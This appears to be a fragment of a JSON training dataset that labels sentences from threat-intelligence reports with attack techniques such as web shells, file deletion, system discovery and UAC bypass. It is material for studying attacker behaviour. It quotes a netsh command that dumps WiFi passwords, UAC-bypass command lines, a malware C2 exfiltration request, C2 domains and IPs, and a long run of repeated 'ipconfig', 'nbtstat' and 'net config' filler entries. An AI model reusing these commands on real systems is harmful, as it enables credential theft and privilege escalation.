        "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address",
        "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B\u00a0for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two",
        "RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address\u2014with some of the information coming from the initial RATAKNBA installation",
        "One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host\u2019s WiFi profiles (settings and passwords) to %APPDATA%\\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\" They then gather more network information with a call to ipconfig and arp -a",
        "Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings",
        "hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter\u2019s service name GUID",
        "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9",
        "(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit",
        "(Source: Dell SecureWorks) Appendix D \u2014 Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address",
        "The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> \u2026 </table>    Table 1 Commands available within XAgent OSX The \u2018showBackupIosFolder\u2019 command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad",
        "Trickbot uses this encrypted module to scan the network and steal relevant network information.",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        "ipconfig ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " nbtstat ",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config",
        " net config"
    ],
    "web shell": [
        "It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers",
        "Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources",
        "Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises",
        "APT40 relies heavily on web shells for an initial foothold into an organization",
        "Web shells are heavily relied on for nearly all stages of the attack lifecycle",
        "Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups",
        "Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment",
        "APT40 strongly favors web shells for maintaining presence, especially publicly available tools",
        "OwaAuth \u2014 This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter",
        "(Source: SecureWorks)  China Chopper web shell \u2014 This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers",
        "(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment",
        "(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion",
        "To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI\u2019s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities",
        "They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft\u2019s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers",
        "Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user\u2019s duties.Restrict users\u2019 ability (permissions) to install and run unwanted software applications, and apply the principle of \u201cLeast Privilege\u201d to all systems and services",
        "Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell",
        "Audit ISAPI filters and search for web shells on Microsoft Exchange servers",
        "ChinaChopper web shell",
        "(Source: Dell SecureWorks) Passwords, like \"admin-na-google123!@#\" shown in Figure 4, are required to interact with the web shell",
        "TG-3390 has used additional web shells containing similarly formatted passwords",
        "However, the OwaAuth web shell password contains the victim organization's name",
        "More information about the OwaAuth web shell is available in Appendix C",
        "ASPXTool \u2014 A modified version of the ASPXSpy web shell (see Figure 6)",
        "ASPXTool web shell",
        "The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size",
        "The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells",
        "TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter",
        "They then identify the Exchange server and attempt to install the OwaAuth web shell",
        "If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells",
        "(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS",
        "Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers",
        "OwaAuth web shell PDB string",
        "Each web shell instance is configured to contain SP, Key, and Log variables",
        "OwaAuth web shell command set",
        "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request.."
    ],
    "application window discovery": [
        "The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)",
        "The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at \u201c%temp%\\Save.tmp\u201d",
        "The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: \u201cGmail -\u201d \u201cYahoo \u2013 login\u201d \u201cSign In -\u201d \u201cOutlook.com -\u201c MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the \u201cSave.tmp\u201d file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used",
        "Because of Poseidon\u2019s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others",
        "Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f \u2013 47)   0x4d Field 1 \u2013 Windows major version (0x6 \u2013 Windows Vista+)   0x51 Field 2 \u2013 Windows minor version (0x1 \u2013 Windows 7)   0x55 Field 3 \u2013 Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 \u2013 Beacon structure for PLAINTEE"
    ],
    "file deletion": [
        "Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product",
        "Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis",
        "The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and\u00a0unfortunately couldn\u2019t restore them after they were deleted",
        "For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network",
        "After running within the %TEMP% path, Comnie will delete the original file",
        "KEYS Deletes the file named by tempPath + \u201cky\u201d file so as not to upload anything",
        "LANS Deletes the file created by the LAN command to reverse the effect",
        "USBS Deletes the file created by the USB command to reverse the effect",
        "HDS Deletes the file created by the HD command to reverse the effect",
        "DEL-TEMP Deletes all files in the \u201cAppData/Local/Temp\u201d path",
        "Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.\u00a0  Delete files using the DeleteFile() API Load an arbitrary library into its process space",
        "The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration",
        "Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase",
        "DEL Deletes a specified file",
        "The message sent to the C2 will be \u201cfile is deleted.\u201d if successful or \u201cfile is not deleted.\u201d if unsuccessful",
        "Deletes existing file",
        "The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section",
        "The dropper will delete itself at the end of the process",
        "After this file is copied, the original \u2018Update.~tmp\u2019 file is deleted",
        "In the event it does, Reaver will move this file to \u2018%TEMP%\\~FJIOW.tmp\u2019 and delete this new file",
        "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",
        "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task",
        "After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution",
        "Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms",
        "This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself",
        "Both \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d and \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d are then deleted",
        "Once they are deleted by the attackers\u2019 code, there is nothing left to be forensically recovered.",
        "and then deletes the original launcher"
    ],
    "standard application layer protocol new service web service exfiltration over command and control channel fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "new service",
            "web service",
            "exfiltration over command and control channel",
            "fallback channels"
        ],
        "sentances": [
            "Indicators    Type Value   MD5 364ff454dcf00420cff13a57bcb78467   SHA256 8bca0031f3b691421cb15f9c6e71ce193 355d2d8cf2b190438b6962761d0c6bb   ssdeep 3072:n+1R4tREtGN4qyGCXdHPYK9l 0H786O26BmMAwyWMn/qwwiHNl:n +1R43QcILXdF0w6IBmMAwwCwwi   MD5 075b6695ab63f36af65f7ffd45cccd39   SHA-256 02c7cf55fd5c5809ce2dce56085ba437 95f2480423a4256537bfdfda0df85592   ssdeep 3072:9ZAxHANuat3WWFY9nqjwbuZf 454UNqRpROIDLHaSeWb3LGmPTrI W33HxIajF:9ZAxHANJAvbuZf454UN +rv eQLZPTrV3Z   MD5 e107c5c84ded6cd9391aede7f04d64c8   SHA-256 fd8b2ea9a2e8a67e4cb3904b49c789d 57ed9b1ce5bebfe54fe3d98214d6a0f61   ssdeep 6144:W/D5tpLWtr91gmaVy+mdckn6 BCUdc4mLc2B9:4D5Lqgkcj+   Path /bin/rsyncd   Path Desc synchronize and backup service   Path ~/.config/dbus-notifier/dbus-inotifier   Path Desc system service d-bus notifier   Path /bin/ksysdefd   Path ~/.config/ksysdef/ksysdefd   Path Desc system kernel service defender   C2 azureon-line[.]com   C2 198.105.125[.]74   C2 mozilla-plugins[.]com   C2 Mozillaplagins[.]com"
        ]
    },
    "system information discovery": [
        "Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself",
        "This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected",
        "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group",
        "OSinfo: OSInfo is a general purpose, system information gathering tool",
        "This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities",
        "The data above contains the hostname (\u2018HOSTNAME-PC\u2019) of the victim machine, as well as an instruction",
        "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with \u20180\u2019 to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters",
        "Once the second DLL is executed, it gathers information about the victim system\u2019s setup, such as operating system version, and driver and processor information",
        "System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors",
        "One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application",
        "Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system",
        "Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim\u2019s machine to the C2 server by sending the REGISTER command to the server",
        "Freenki is used to gather information about the infected system and to download a subsequent stage payload",
        "The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase",
        "You can see that in addition to the code, the author copy-pasted English typos such as \"IE Registery\":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\" campaign)d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North Korean Human Rights\" campaignD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb (From the \"Are You Happy?\" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)",
        "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a \u201c!Hello\u201d message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version",
        "The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are \u201c1.3\u201d and \u201cKdfrJKN\u201d",
        "Parameter   Description    \u2018u=\u2019  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    \u2018&h=\u2019  This parameter includes the information about the command executed and its results",
        "The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth",
        "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information",
        "The HandlePP::getClientID method uses the following environment variables:   Figure 11.\u00a0Serial number   Figure 12.\u00a0Hardware UUID   Figure 13.\u00a0MAC address   Figure 14.\u00a0Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15.\u00a0OS version Running getpwuid ->pw_name , scutil \u2013 -get ComputerName, and uname \u2013m will provide the following returns respectively:  Mac OSX 10.12",
        "As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests",
        "Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified",
        "Here is an example of the result of ps\u00a0ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X\u2019s keychain",
        "POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.:\u00a0MacBookPro9,2)  Most actions are self-explanatory",
        "Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness",
        "This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target\u2019s operating system and e-mail client (or browser)",
        "This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware",
        "A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components",
        "The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim",
        "Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection",
        "A multilayered approach is a must to securing the organization\u2019s perimeter, especially for information security professionals and system/IT administrators",
        "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label \u201cC:\\\u201d and the computer name",
        "Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers",
        "Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums",
        "Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources",
        "URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v",
        "The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions",
        "Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities",
        "itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an \u201cagent_id\u201d, which is a unique identifier for each compromised host",
        "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the \u201cHardware UUID\u201d listed in the system information application, as seen in the Figure 3 screenshot of our analysis system",
        "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was \u201c0000\u201d",
        "The payload sends system information about the infected computer to the C&C server and downloads additional tools.",
        "If it is successful then it will send out basic host information and await further commands.",
        "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.",
        "Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address",
        "",
        "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services."
    ],
    "system information discovery system network configuration discovery-multi": {
        "technique_names": [
            "system information discovery",
            "system network configuration discovery"
        ],
        "sentances": [
            "This has led it to do more, such as:  Communication with more C&C servers \u2013 up to 16 P2P communication between infected nodes MAC address check - PlugX runs if the MAC address of an infected host\u00a0coincides with configuration information in itself (If not specified in the configuration, PlugX runs on any host)",
            "The started command will send the following information to the C&C:  device_model: the model identifier (e.g.: MacBookPro9,2) bot_version: version of Keydnap build_name: the \u201cbuild name\u201d that was given by downloader os_version: OS X or macOS kernel version ip_address: external IP address as reported by ipify.org has_root: 1 if executed as root, 0 otherwise  Backdoor commands The response to get_task contains an integer to identify the type of command and optional arguments",
            "AC,CNAME,MX,TXT,SRV,SOA Uses the regular expression \u2018Address:\\s+(\\d+.\\d+.\\d+.\\d+)\u2019 and uses the decimal value in the first octet of that IPv4 address    Table 1 Breakdown of query types Once the system identifier is obtained, the payload gathers system specific information and sends it to the C2 server"
        ]
    },
    "bypass user account control": [
        "(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced",
        "This request is followed by a call to \u201cGetisrunasAbById\u201d to determine if the Trojan should use \u201crunas\u201d to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click",
        "The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)",
        "The macro then extracts the CAB file into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:  cmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows",
        "The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS"
    ],
    "system network configuration discovery fallback channels-multi": {
        "technique_names": [
            "system network configuration discovery",
            "fallback channels"
        ],
        "sentances": [
            "When one PlugX succeeds to infect a host, it then accesses to every IP address in the local network one-by-one and communicate with any connectable nodes, using one of the following protocols listed in Table 2",
            "We include a list of observed\u00a0hardcoded ip C2 addresses here, along with the address owner and geophysical location of the host:    C2 IP address Owner Country   184.22.205.194 hostnoc.net US   5.79.80.166 Leaseweb NL   46.165.222.28 Leaseweb NL   95.211.122.36 Leaseweb NL   46.165.222.101 Leaseweb NL   46.165.222.6 Leaseweb NL   89.149.223.205 Leaseweb NL   85.17.94.134 Leaseweb NL   46.4.28.218 Hetzner DE   78.46.40.239 Hetzner DE   95.143.193.182 Serverconnect SE   188.227.176.74 Redstation GB   93.170.127.100 Nadym RU   37.220.34.56 Yisp NL   194.28.172.58 Besthosting.ua UA   124.217.253.10 PIRADIUS MY   84.19.161.123 Keyweb DE   109.236.88.12 worldstream.nl NL   212.124.110.62 digitalone.com US   5.61.38.31 3nt.com DE   5.255.87.39 serverius.com NL    It\u2019s interesting that one of these servers is a Tor exit node"
        ]
    },
    "system time discovery": [
        "Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself",
        "The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph",
        "Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code",
        "These four were then all modified on the same date and time on October 13, 2018 08:21",
        "A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time",
        "Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication",
        "This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017",
        "The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)",
        "The time of the observed attacker activity coincides with Iran\u2019s Daylight Time, which is +0430 UTC",
        "Cadelle and Chafer are most active during the day time within Iran\u2019s time zone and primarily operate during Iran\u2019s business week (Saturday through Thursday)",
        "When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode",
        "If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period",
        "This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode",
